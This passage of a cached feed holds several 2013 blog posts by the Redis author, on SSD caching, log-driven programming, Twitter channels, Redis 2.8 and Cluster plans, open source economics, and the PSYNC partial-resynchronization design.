<br>Redis is completely useless in this way. Systems designed to work in this kind of setups like Twitter fatcache or the recently announced Facebook McDipper need to be SSD-aware, and can probably work reasonably only when a simple GET/SET/DEL model is used.
<br>
<br>I also expect that the pathological case for this systems, that is evenly distributed writes with big span, is not going to be excellent because of current SSD disk limits, but that's exactly the case Redis is trying to solve for most users.
<br>
<br>The freedom Redis gets from the use of memory allows us to serve much more complex tasks at very good peak performance and with minimal system complexity and underlying assumptions.
<br>
<br>TL;DR: the outcome of this test was expected and Redis is an in-memory system :-)
<a href=\"http://antirez.com/news/52\">Comments</a>" nil "http://antirez.com/news/52" "bfe00f4ce7e5287d5a851ff1fbe16b3b") (5 (26588 31766 977396 641000) "http://antirez.com/news/51
" "Log driven programming is a real productivity booster. " nil "Tue, 26 Feb 2013 15:40:42 +0000" "One thing, more than everything else, keeps me focused while programming: never interrupt the flow.
<br>
<br>If you ever wrote some complex piece of code you know what happens after some time: your mental model of the software starts to be very complex with different ideas nested inside other ideas, like the structure of your program is, after all.
<br>
<br>So while you are writing this piece of code, you realize that because of it you need to do that other change. Something like \"I'm freeing this object here, but it's connected to this two other objects and I need to do this and that in order to ensure consistent state\".
<br>
<br>The worst thing you can do is to interrupt what you are currently doing in order to fix the new problem. Instead just write freeMyObject() and don't care, but at the same time, open a different editor, and write:
<br>
<br>* freeMyObject() should make sure to remove references from XYZ bla bla bla.
<br>
<br>When you finished with the current function / task / whatever, re-read your notes and implement what is possible to implement. You'll get new ideas or new things to fix, use the same trick again, and log your ideas without interrupting the flow.
<br>
<br>In this way parts of the program make sense, individually. You can address the other parts later. This is 100 times better than nested-thinking, where you need to stop, do another task, and return back. Humans don't have stack frames.
<br>
<br>For my log I use Evernote because the log needs to have one characteristic: No save, No filenames, Nothing more than typing something. Evernote will save it for you, and is a different physical interface compared to your code editor. This in my experience improves the 2 seconds switch you need to log.
<br>
<br>After some time your log starts to be long. When you realize most of it feels old as your code base and your idea of the system evolved, trace a like like this:
<br>
<br>-------------------- OLD STUFF ---------------------
<br>
<br>And continue logging again. From time to time however, re-read your old logs. You may find some gems.
<a href=\"http://antirez.com/news/51\">Comments</a>" nil "http://antirez.com/news/51" "1fc9cc16622a8fd38e82745a4b0db984") (4 (26588 31766 977244 312000) "http://antirez.com/news/50
" "An idea for Twitter " nil "Tue, 26 Feb 2013 15:40:24 +0000" "After the \"sexism gate\" I started to use my Twitter account only for private stuff in order to protect the image of Redis and/from my freedom to say whatever I want. It did not worked actually since the reality is that people continue to address you with at-messages about Redis stuff.
<br>
<br>But the good outcome is that now I created a @redisfeed account that I use in order to provide a stream of information to Redis users that are not interested in my personal tweets  not related to Redis. Anyway when I say some important thing regarding Redis with my personal account, I just retweet in the other side, so this is a good setup.
<br>
<br>However... I wonder if Twitter is missing an opportunity for providing a better service here, that is, the concept of \"channels\".
<br>
<br>Basically I'm a single person, but I've multiple logical streams of informations:
<br>
<br>1) I tweet about Redis.
<br>2) I tweet about other technological stuff.
<br>3) I say things related to my personal life.
<br>4) Sometimes I tweet things in Italian language.
<br>
<br>Maybe there are followers interested in just one or a few of these logical channels, so it would be cool for Twitter users to be able to follow only a subset of the channels of another twitter user.
<br>
<br>Probably this breaks the idea of simplicity of Twitter, but I'm pretty sure there are ways to present such a feature in an interesting way: by default all users have a single channel and following them in general means to follow all the channels, it is only as a refinement and only if the user created multiple channels that you can fine-tune what you follow and what not, so basically the added complexity would be minimal.
<br>
<br>I'm pretty sure that now that Twitter is designed with the average user in mind such a feature will never be implemented actually, without to mention that this may add some serious technological complexity to their infrastructure, but maybe in the long run such a feature may be more vital than we believe now because it is pretty related to the \"information diet\" concept.
<a href=\"http://antirez.com/news/50\">Comments</a>" nil "http://antirez.com/news/50" "f4e588b4e3414225338d17ff883de985") (3 (26588 31766 977079 414000) "http://antirez.com/news/49
" "News about Redis: 2.8 is shaping, I'm back on Cluster. " nil "Wed, 13 Feb 2013 15:40:06 +0000" "This is a very busy moment for Redis because the new year started in a very interesting way:
<br>
<br>1) I finished the Partial Resynchronization patch (aka PSYNC) and merged it into the unstable and 2.8 branch. You can read more about it here: http://antirez.com/news/47
<br>2) We finally have keyspace changes notifications: http://redis.io/topics/notifications
<br>
<br>Everything is already merged into our development branches, so the deal is closed, and Redis 2.8 will include both the features.
<br>
<br>I'm especially super excited about PSYNC, as this is a not-feature, simply you don't have to deal with it, the only change is that slaves work A LOT better. I love adding stuff that is transparent for users, just making the system better and more robust.
<br>
<br>What I'm even more excited about is the fact that now that PSYNC and notifications are into 2.8, I'll mostly freeze it and can finally focus on Redis Cluster.
<br>
<br>It's  a lot of time that I wait to finish Redis Cluster, now it's the right time because Redis 2.6 is out and seems very stable, people are just starting to really discovering it and the ways it is possible to use Lua scripting and the advanced bit operations to do more. Redis 2.8 is already consolidated as release, but requires a long beta stage because we touched the inner working of replication. So I can pause other incremental improvements for a bit to focus on Redis Cluster. Basically my plan is to work mostly to cluster as long as it does not reach beta quality, and for beta quality I mean, something that brave users may put into production.
<br>
<br>Today I already started to commit new stuff to Cluster code. Hash slots are now 16384 instead of 4096, this means that we are now targeting clusters of ~1000 nodes. This decision was taken because there are big Redis users with already a few hundred of nodes running.
<br>
<br>Another change is that probably, in order to ship Cluster ASAP, in the first stage I plan to use Redis Sentinel in order to failover master nodes (but Sentinel will be able to accept as configuration a list of addresses of cluster nodes and will fetch all the other nodes using CLUSTER NODES).
<br>
<br>So basically the first version of Redis Cluster to hit a stable release will have the following features:
<br>
<br>1) Automatic partition of key space.
<br>2) Hot resharding.
<br>3) Only single key operations supported.
<br>
<br>The above is already implemented but there is more work to do in order to move all this from alpha to beta quality. There is also a significant amount of work to do in library clients, and I'll try to provide an initial reference implementation based on redis-rb (actually I hope to just write a wrapper library).
<br>
<br>Note that \"3\" is here to stay, there are currently no plans to extend Cluster to anything requiring keys to be moved back on forth magically. But MIGRATE COPY will provide a way for users to move keys into spare instances to perform computations with multiple keys.
<br>
<br>Of course all this modulo critical bugs. If there is something odd with stable releases I'll stop everything and fix it as usually :-)
<a href=\"http://antirez.com/news/49\">Comments</a>" nil "http://antirez.com/news/49" "2b2a9e30d686c36a7c75d5dd4a2a0766") (2 (26588 31766 976861 231000) "http://antirez.com/news/48
" "A few thoughts about Open Source Software " nil "Sat, 26 Jan 2013 15:39:43 +0000" "For a decade and half I contributed to open source regularly, and still it is relatively rare that I stop to think a bit more about what this means for me. Probably it is just because I like to write code, so this is how I use my time: writing code instead of thinking about what this means… however lately I'm starting to have a few recurring ideas about open source, its relationship with the IT industry, and my interpretation of what OSS is, for me, as a developer.
<br>
<br>First of all, open source for me is not a way to contribute to the free software movement, but to contribute to humanity. This means a lot of things, for instance I don't care about what people do with my code, nor if they'll release back their modifications. I simply want people to use my code in one way or the other.
<br>
<br>Especially I want people to have fun, learn new stuff, and *make money* with my code. For me other people making money out of something I wrote is not something that I lost, it is something that I gained.
<br>
<br>1) I'm having a bigger effect in the world if somebody can pay the bills using my code.
<br>2) If there are N subjects making money with my code, maybe they will be happy to share some of this money with me, or will be more willing to hire me.
<br>3) I can be myself one of the subjects making money with my code, and with other open source software code.
<br>
<br>For all this reasons my license of choice is the BSD licensed, that is the perfect incarnation of \"do whatever you want\" as a license.
<br>
<br>However clearly not everybody thinks alike, and many programmers contributing to open source don't like the idea that other people can take the source code and create business out of it as a commercial product that is not released under the same license.
<br>To me instead many of the rules that you need to follow to use the GPL license are a practical barrier reducing the actual freedom of what people can do with the source code. Also I've the feeling that receiving back contributions it is not too much related to the license: if something is useful people will contribute back in some way, because maintaining forks is not great. The real gold is where development happens. Unfixed, not evolved code bases are worth zero. If you as an open source developer can provide value, other parties will be more stimulated to get their changes incorporated.
<br>
<br>Anyway, I'm much more happy with less patches merged and more freedom from the point of view of the user, than the reverse, so there is not much to argue for me.
<br>
<br>In my opinion instead what the open source does not get back in a fair amount is money, not patches. The new startups movement, and the low costs of operations of many large IT companies, are based on the existence of so much open source code working well. Businesses should try to share a small fraction of the money they earn with the people that wrote the open source software that is a key factor for their success, and I think that a sane way to redistribute part of the money is by hiring those people to just write open source software (like VMware did with me), or to provide donations.
<br>
<br>Many developers do a lot of work in their free time for passion, only a small percentage happens to be payed for their contribution to open source. Some redistribution may allow more people to focus on the code they write for passion and that possibly has a much *important effect* on the economy compared to what they do at work to get the salary every month. And unfortunately it is not possible to pay bills with pull requests, so why providing help to the project with source contributions is a good and sane thing to do, it is not enough in my opinion.
<br>
<br>You can see all this from a different point of view, but what I see is that a lot of value in the current IT industry is provided by open source software, often written in the spare time, or with important efforts filling the time gaps between one thing and another thing you do in your work time, if your employer is kind enough to allow you to do so.
<br>
<br>What I think is that this is economically suboptimal, a lot of smart coders could provide an economical boost if they could be more free to write what they love and what a lot of people are probably already using to make money.
<a href=\"http://antirez.com/news/48\">Comments</a>" nil "http://antirez.com/news/48" "6d2af6d2db4310435e5b0933033e4ec5") (1 (26588 31766 976563 375000) "http://antirez.com/news/47
" "PSYNC " nil "Wed, 16 Jan 2013 15:39:22 +0000" "Dear Redis users, in the final part of 2012 I repeated many time that the focus, for 2013, is all about Redis Cluster and Redis Sentinel.
<br>
<br>This is exactly what I'm going to do from the point of view of the big picture, however there are many smaller features that make a big difference from the point of view of the Redis user day to day operations. Such features can't be ignored as well. They are less shiny in a feature list, and they are not good to generate buzz and interest in new users, and sometimes boring to code, but they are very important from a practical point of view.
<br>
<br>So I ended the year and I'm starting the new one spending considerable time on a feature that was long awaited by many users having production instances crunching data every day, that is, the ability for a slave to partially resynchronize with the master without requiring a full resynchronization every time.
<br>
<br>The good news is that finally today I've an implementation that works well in my tests. This means that this feature will be present in Redis 2.8, so it is the right time to start making users aware of it, and to describe how it works.
<br>
<br>Some background
<br>---
<br>
<br>Redis replication is a pretty brutal piece of code in many ways:
<br>
<br>1) It works by re-playing on slaves every command that was received in the Redis master that actually produced a change in the data set.
<br>2) From the point of view of slaves, masters are just a bit special clients, but they are almost like normal clients sending commands. No special replication protocol or data format used for replication.
<br>3) It *used to force* a full resynchronization every time a slave connects to a master. This means, at every connection, the slave will receive a copy of the master data set, in form of an RDB file, and load it.
<br>
<br>Because of this characteristics Redis replication has been very reliable from the point of view of corruption. If you always full-resync, there are little chances for inconsistency. Also it was architecturally trivial, because masters are like clients, no special protocol is used and so forth.
<br>
<br>Simple and reliable, what can go wrong? Well, what goes wrong is that sometimes even when simplicity is very important, to do an O(N) work when zero work is needed is not a good idea. I'm looking at you, point three of my list.
<br>
<br>Consider the following scenario:
<br>
<br>* Slave connect to master, and full resync.
<br>* Master and slave chat for one hour.
<br>* Slave disconnects from Master because of some silly network issue for 2 seconds.
<br>
<br>A full resynchronization to reconnect is required. It was a design sacrifice because after all we are dealing with RAM-sized data sets. It can't be so hard. But actually as RAM gets cheaper, and big users more interested in Redis, we have many production instances with big data sets that need to full resync at every network issue.
<br>
<br>Also resynchronization involves unpleasant things:
<br>
<br>1) The disk is involved, since the slave saving the RDB file needs to write that file somewhere.
<br>2) The master is forced to create an RDB file. Not a big deal as this master is supposed to save or write the AOF anyway, but still, more I/O without a good reason.
<br>3) The slave needs to block at some point after reconnection in order to load the RDB file into memory.
<br>
<br>This time it was the case to introduce complexity in order to make things better.
<br>
<br># So now Redis sucks as well?
<br>
<br>MySQL is one of the first databases I get exposed for sure, a few decades ago, and the first time I had to setup replication I was shocked about how much it sucked. Are you serious that I need to enable binary logs and deal with offset?
<br>
<br>Redis replication, that everyone agrees is dead-simple to setup, is more or less a response to how much I dislike MySQL replication from the point of view of the \"user interface\".
<br>
<br>Even if we needed partial replicaton, I didn't wanted Redis to be like that.
<br>However to perform partial resynchronization you in some way or the other need something like that:
<br>
<br><slave> Hi Master! How are you? Remember that I used to be connected with you and we were such goooood friends?
<br><master> Hey Slave! You still here piece of bastard...
<br><slave> Well, shut up and give me data starting from offset 282233943 before I signal you to the Authority Of The Lazy Databases.
<br><master> Fu@**#$(*@($! ... 1010110010101001010100101 ...
<br>
<br>So the obvious solution is to have a file in the master side with all the data so that when a slave wants to resync, we can provide any offset without problems just reading it from the file. Except that this sucks a lot: We became append-to-disk-bound even if AOF is disabled, need to deal with the file system that can get full, slow (Hey EC2!), and files to rotate one way or the other. Horrid.
<br>
<br>So the following is a description about how Redis partial resynchronization implementation again accepts sacrifices to avoid to suck like that.
<br>
<br># Redis PSYNC
<br>
<br>Redis partial resynchronization does two design sacrifices.
<br>It accepts that the slave will be able to resynchronize only if:
<br>
<br>1) It reconnects in a reasonable amount of time.
<br>2) The master was not restarted.
<br>
<br>Because of this two relaxed requirements, instead of using a file, we can use a simple buffer inside our... Memory! Don't worry, a very acceptable amount of memory.
<br>
<br>So a Redis master is modified in order to:
<br>
<br>* Unify the data that is sent to the slave, so that every slave receives exactly the same things. We were about here already, but SELECT and PING commands were sent in a slave-specific fashion. Now instead the replication output to slaves is unified.
<br>* Take a backlog of what we send to slaves. So for instance we take 10 MB of past data.
<br>* Take a replication global offset, that the user never needs to deal with. We simply provide this offset to the slave, that will increment it every time it receives data. This way the slave is able to ask for partial resynchronization indicating the offset to start with.
<br>
<br>Oh also, we don't want the system to be fragile, so we use the master \"run id\", that is a concept that was introduced in Redis in the past as an unique identifier of a given instance execution. When the slave synchronizes with the master, it also gets the master run id, so that a next partial resynchronization attempt will be made only if the master is the same, as in, the exact same execution of Redis.
<br>
<br>Also the PSYNC command was introduced as a variant of SYNC for partially resync capable instances.
<br>
<br># How all this works in practice?
<br>
<br>When the slave gets disconnected, you'll see something like this:
<br>
<br>[60051] 17 Jan 16:52:54.979 * Caching the disconnected master state.
<br>[60051] 17 Jan 16:52:55.405 * Connecting to MASTER...
<br>[60051] 17 Jan 16:52:55.405 * MASTER <-> SLAVE sync started
<br>[60051] 17 Jan 16:52:55.405 * Non blocking connect for SYNC fired the event.
<br>[60051] 17 Jan 16:52:55.405 * Master replied to PING, replication can continue...
<br>[60051] 17 Jan 16:52:55.405 * Trying a partial resynchronization (request 6f0d582d3a23b65515644d7c61a10bf9b28094ca:30).
<br>[60051] 17 Jan 16:52:55.406 * Successful partial resynchronization with master.
<br>[60051] 17 Jan 16:52:55.406 * MASTER <-> SLAVE sync: Master accepted a Partial Resynchronization.
<br>
<br>See the first line, the slave *caches* the master client structure, so that all the buffers are saved to be reused if we'll be able to resynchronize.
<br>
<br>In the master side we'll see instead:
<br>
<br>[59968] 17 Jan 16:52:55.406 * Slave asks for synchronization
<br>[59968] 17 Jan 16:52:55.406 * Partial resynchronization request accepted. Sending 0 bytes of backlog starting from offset 30.
<br>
<br>So basically, as long as the data is still available as no more than N bytes worth of Redis protocol (of write commands) was sent to the master, the slave will be still able to reconnect. Otherwise a full resynchronization will be performed. How much backlog to allocate is up to the user.
<br>
<br># Current status
<br>
<br>The 'psync' branch on my private repository now seems to work very well, however this is Very Important Code and must be tested a lot. This is what I'm doing right now. When I'm considerably sure the code is solid, I'll merge into unstable and 2.8 branch. When it runs for weeks without issues and starts to be adopted by the brave early adopters, we'll release 2.8 with this and other new features.
<a href=\"http://antirez.com/news/47\">Comments</a>" nil "http://antirez.com/news/47" "ca9279975af3f5f33b88634d0d85f60e")))